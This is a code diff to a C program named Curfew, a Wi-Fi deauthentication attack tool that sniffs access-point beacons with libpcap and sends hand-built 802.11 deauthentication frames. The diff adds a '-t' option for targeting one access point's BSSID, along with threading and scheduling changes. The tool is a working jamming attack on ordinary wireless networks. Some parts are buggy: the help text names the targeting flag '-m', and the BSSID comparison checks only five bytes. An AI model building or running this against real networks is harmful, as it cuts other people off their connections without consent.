@@ -30,9 +30,8 @@
 #include <pthread.h>
 #include <unistd.h>
 #include <signal.h>
-#include <time.h>
 
-#define VERSION "1.0"
+#define VERSION "1.01"
 
 /* Define the macros below as empty if you do not want forced colours. */
 #define CYAN "\x1b[1;36m"
@@ -41,7 +40,8 @@
 #define RED "\x1b[1;31m"
 #define COLOUR_RESET "\x1b[0m"
 
-const unsigned char EXAMPLE___deauthFrame___[34] = /* Seems to be a proper packet, created manually by hand. */
+/* Pre-warning: All packet parsing and byte manipulation was done by hand, a few things may be incorrect or overlooked! */
+const unsigned char EXAMPLE___deauthFrame___[34] = 
 {
 	0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, /* 802.11 deauthentication frame (type 0, subtype 12). */
 
@@ -87,7 +87,9 @@ int c; /* Signed integer loop variable. */
 unsigned int captureLimit; /* Amount of targets to capture, unsigned or signed doesn't matter, never going to catch that many APs anyway. */
 int captureLimitRetry; /* Restarts capture when limit reached. */
 
+unsigned int specifiedAP[6];
 unsigned int ignoredAP[6];
+int specificAP;
 int ignoreAP;
 
 int showMoreInfo; /* Must be set to anything other than zero to do what it is named. */
@@ -123,9 +125,20 @@ void beaconCapture(__attribute__((unused))unsigned char *args, const struct pcap
 	targetNameLength = beaconCaptured + beaconCaptured[2] + 37; /* To properly print the ESSID, you must need the length, or else garbage obviously appears with it. */
 	packetSize = header -> caplen; /* `len` and `caplen` seem to not make a difference in the end? Using `caplen` probably makes parsing faster as it shows what was actually captured of the packet? */
 
-	if(exiting == 1)
+	/* if(exiting == 1)
 	{
 		return;
+	} */
+
+	if(specificAP == 1)
+	{
+		for(d = 0; d < 6; ++d)
+		{
+			if(memcmp(&specifiedAP[d], &target[d], 1) != 0)
+			{
+				return;
+			}
+		}
 	}
 
 	if(ignoreAP == 1)
@@ -277,7 +290,6 @@ void beaconCapture(__attribute__((unused))unsigned char *args, const struct pcap
 void stop(__attribute__((unused))int args) /* Signal Interrupt (CTRL + C) handler. With a regular SIGINT exit and without this handler, it can mess up your interface and require a reset during usage. */
 {
 	printf("\nINFO: Exiting...\n");
-	captureLimit = 0;
 	exiting = 1;
 	pcap_breakloop(handle);
 }
@@ -289,14 +301,10 @@ void *capture(__attribute__((unused))void *args) /* Thread function containing p
 
 	while(exiting == 0)
 	{
-		while(i < captureLimit)
-		{
-			pcap_loop(handle, 1, beaconCapture, NULL);
-		}
+		pcap_loop(handle, captureLimit, beaconCapture, NULL);
 
 		if(exiting != 0)
 		{
-			printf(GREEN "\nSUCCESS: Exited Curfew\n\n" COLOUR_RESET);
 			pthread_exit(NULL);
 		}
 		else if(captureLimitRetry == 0)
@@ -353,7 +361,9 @@ int main(int argc, char *argv[])
 
 	struct sched_param schedParam; /* Used to store the priority number of the scheduling policy and only that. */
 	char schedPolicy; /* Scheduling policies have a byte value, e.g. `SCHED_FIFO` is actually a preprocessor macro that means 1. Check "include uapi/linux/sched.h" for recent kernels, or "include linux/sched.h" for older ones. */
-	char schedPolicyName[10]; /* Again, policies are truly bytes, http://www.linuxjournal.com/article/3910, so this is used to identify which policy is intended. */
+	char schedPolicyName[20]; /* Again, policies are truly bytes, http://www.linuxjournal.com/article/3910, so this is used to identify which policy is intended. */
+	int schedPolicyMIN; /* Done for cleaner code and less function calls further below. */
+	int schedPolicyMAX;
 
 	int dlt; /* Used to determine if WLAN device is using Radiotap headers or not, very important the user knows. */
 	const char *dltName;
@@ -365,9 +375,11 @@ int main(int argc, char *argv[])
 	pthread_attr_t threadAttribute;
 	pthread_attr_init(&threadAttribute);
 
-	device = pcap_lookupdev(errorBuffer); /* Default device. Would it be better if it was `wlan0` instead? Ethernet devices likely get caught in this. */
+	device = pcap_lookupdev(errorBuffer); /* Default device. Would it be better if it was `wlan0` instead? Ethernet devices likely get caught in this? */
 	cores = 2; /* Set to 2 `trueCores` for the `threads` array C89 workaround by default, this is actually 3 cores but this crossover of both variables happens only once. */
 	captureLimit = -1; /* No actual default limit, but technically the max size of an unsigned integer as it overflows to the max size itself. Only guaranteed for unsigned int. */
+	specificAP = 0;
+	ignoreAP = 0;
 	schedPolicy = SCHED_OTHER;
 	strcpy(schedPolicyName, "SCHED_OTHER"); /* This is the default scheduling policy. */
 
@@ -423,7 +435,11 @@ int main(int argc, char *argv[])
 			printf(" |         Specify The Client To Deauthenticate\n");
 
 			putchar('\n');
-			printf(" |    -i | e.g. curfew -m AA:BB:CC:DD:EE:FF | Default - Nothing Ignored\n");
+			printf(" |    -m | e.g. curfew -t 11:22:33:44:55:66 | Default - Every AP Found\n");
+			printf(" |         Specify The AP To Deauthenticate\n");
+
+			putchar('\n');
+			printf(" |    -i | e.g. curfew -i AA:BB:CC:DD:EE:FF | Default - Nothing Ignored\n");
 			printf(" |         Specify The AP To Ignore\n");
 
 			putchar('\n');
@@ -447,7 +463,7 @@ int main(int argc, char *argv[])
 	}
 	else
 	{
-		printf(GREEN "\nSUCCESS: Starting...\n\n");
+		printf(GREEN "\nSUCCESS: Starting Curfew With %s...\n\n" COLOUR_RESET, device);
 	}
 
 	for(argi = 1; argi < argc; ++argi)
@@ -538,22 +554,25 @@ int main(int argc, char *argv[])
 		if(strcmp(argv[argi], "-p") == 0) /* Priority number must be set after `SCHED_POLICY` has been set, as different policies have different scheduling priority limits/ranges. */
 		{
 			/* TODO: Perhaps stop with the multiple `sched_get...` functions and just assign it to a int variable instead? */
-			if(atoi(argv[argi + 1]) >= sched_get_priority_min(schedPolicy) && atoi(argv[argi + 1]) <= sched_get_priority_max(schedPolicy))
+			schedPolicyMIN = sched_get_priority_min(schedPolicy);
+			schedPolicyMAX = sched_get_priority_max(schedPolicy);
+
+			if(atoi(argv[argi + 1]) >= schedPolicyMIN && atoi(argv[argi + 1]) <= schedPolicyMAX)
 			{
 				schedParam.sched_priority = atoi(argv[argi + 1]);
 			}
-			else if(atoi(argv[argi + 1]) < sched_get_priority_min(schedPolicy) || atoi(argv[argi + 1]) > sched_get_priority_max(schedPolicy))
-			{
-				fprintf(stderr, YELLOW "WARNING: Scheduling Priority %s Is Outside Range Of Scheduling Policy (%d to %d), Continuing With Default\n" COLOUR_RESET, argv[argi + 1], sched_get_priority_min(schedPolicy), sched_get_priority_max(schedPolicy));
-				schedParam.sched_priority = sched_get_priority_min(schedPolicy);
-			}
 			else if(strcmp(argv[argi + 1], "MAX") == 0 || strcmp(argv[argi + 1], "max") == 0)
 			{
-				schedParam.sched_priority = sched_get_priority_max(schedPolicy);
+				schedParam.sched_priority = schedPolicyMAX;
 			}
 			else if(strcmp(argv[argi + 1], "MIN") == 0 || strcmp(argv[argi + 1], "min") == 0)
 			{
-				schedParam.sched_priority = sched_get_priority_min(schedPolicy);
+				schedParam.sched_priority = schedPolicyMIN;
+			}
+			else if(atoi(argv[argi + 1]) < schedPolicyMIN || atoi(argv[argi + 1]) > schedPolicyMAX)
+			{
+				fprintf(stderr, YELLOW "WARNING: Scheduling Priority %s Is Outside Range Of Scheduling Policy (%d to %d), Continuing With Default\n" COLOUR_RESET, argv[argi + 1], schedPolicyMIN, schedPolicyMAX);
+				schedParam.sched_priority = schedPolicyMIN;
 			}
 			else
 			{
@@ -578,6 +597,29 @@ int main(int argc, char *argv[])
 
 			printf(GREEN "SUCCESS: Ignored BSSID Set To %02X:%02X:%02X:%02X:%02X:%02X\n" COLOUR_RESET, ignoredAP[0], ignoredAP[1], ignoredAP[2], ignoredAP[3], ignoredAP[4], ignoredAP[5]);
 		}
+
+		if(strcmp(argv[argi], "-t") == 0) /* Does the above in similiar fashion. */
+		{
+			specificAP = 1;
+			sscanf(argv[argi + 1], "%02X:%02X:%02X:%02X:%02X:%02X", &addressMAC[0], &addressMAC[1], &addressMAC[2], &addressMAC[3], &addressMAC[4], &addressMAC[5]);
+
+			for(t = 0; t <= 5; ++t)
+			{
+				specifiedAP[t] = addressMAC[t];
+			}
+
+			printf(GREEN "SUCCESS: Targetted BSSID Set To %02X:%02X:%02X:%02X:%02X:%02X\n" COLOUR_RESET, specifiedAP[0], specifiedAP[1], specifiedAP[2], specifiedAP[3], specifiedAP[4], specifiedAP[5]);
+		}
+	}
+
+	if(specificAP == 1 && ignoreAP == 1)
+	{
+		if(memcmp(&specifiedAP[d], &ignoredAP[d], 5) == 0)
+		{
+			printf(YELLOW "WARNING: The Ignored BSSID And The Specific BSSID To Target Were The Same, Neither Are In Effect\n" COLOUR_RESET);
+			specificAP = 0;
+			ignoreAP = 0;
+		}
 	}
 
 	threads[0] = 0 + cores * sizeof(pthread_t); /* Creates less unused threads, as opposed to just creating 100 potential threads in the array and only using as many as needed. */
@@ -588,9 +630,8 @@ int main(int argc, char *argv[])
 /*	Debug purposes only (for checking most command line arguments). */
 
 	handle = pcap_create(device, errorBuffer);
-	pcap_set_buffer_size(handle, 67108864);
-	pcap_set_snaplen(handle, 1024);
-	pcap_set_timeout(handle, 1000);
+	pcap_set_buffer_size(handle, 4 * 1024 * 1024);
+	pcap_set_snaplen(handle, 65535 * 2);
 
 	if(pcap_set_promisc(handle, 1) == 0)
 	{
@@ -767,17 +808,24 @@ int main(int argc, char *argv[])
 		}
 		else
 		{
-			fprintf(stderr, YELLOW "         WARNING: System Only Has %d/%d Actual Cores, Cannot Create Thread %d+\n" COLOUR_RESET, trueCores, cores, t);
+			fprintf(stderr, YELLOW "         WARNING: System Only Has %d/%d Actual Cores, Cannot Create Thread %d+\n" COLOUR_RESET, trueCores, cores, t + 1);
 			break;
 		}
 	}
 
-	for(t = 0; t <= cores; ++t) /* I believe this loop for `pthread_join` is useless, as the thread functions never terminate in the first place. */
+	if(ceaseFire == 1)
 	{
-		pthread_join(threads[t], NULL); /* Only a single thread must be joined so `int main` does not close prematurely and kill our created threads. Joining all anyway because why not? */
+		pthread_join(threads[0], NULL);
+	}
+	else
+	{
+		pthread_join(threads[0], NULL);
+		pthread_join(threads[1], NULL);
 	}
 
 	pcap_freecode(&filter);
 	pcap_close(handle);
+	
+	printf(GREEN "\nSUCCESS: Exited Curfew\n\n" COLOUR_RESET);
 	return EXIT_SUCCESS;
 }
